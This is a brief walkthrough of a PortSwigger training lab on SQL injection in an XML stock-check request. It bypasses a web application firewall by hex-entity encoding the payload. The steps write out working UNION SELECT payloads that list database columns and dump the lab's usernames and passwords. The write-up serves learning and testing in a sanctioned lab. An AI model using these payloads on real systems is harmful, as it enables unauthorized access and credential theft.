https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding

Lab objective: log in as the `administrator` user.

This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.

A web application firewall (WAF) will block requests that contain obvious signs of a SQL injection attack.

# Lab: SQL injection with filter bypass via XML encoding

1. Find we will find stock check feature. Under product we will find it.
2. In xml if we write malicious SQL like `<storeId>2 UNION SELECT NULL</storeId>` the response is `"Attack detected"`
3. So we need to bypass this so if we do this so `<storeId><@hex_entities>2 UNION SELECT NULL</@hex_entities></storeId>` and response is `725 units null`
4. Now we need to  find column name of the users table the query is `<storeId><@hex_entities>2 UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'</@hex_entities></storeId>` and we get this
email
password
725 units
username
5. When we give this query `<storeId><@hex_entities>2 UNION SELECT username|| ' *** ' || password FROM users</@hex_entities></storeId>` we get this 


carlos *** dilu7z1jy3lmsqdq34nm
725 units
administrator *** bjvpebls33axjgpvrcy9
wiener *** 9rmxuhko2cerpooqosig

5. Now login and complete this lab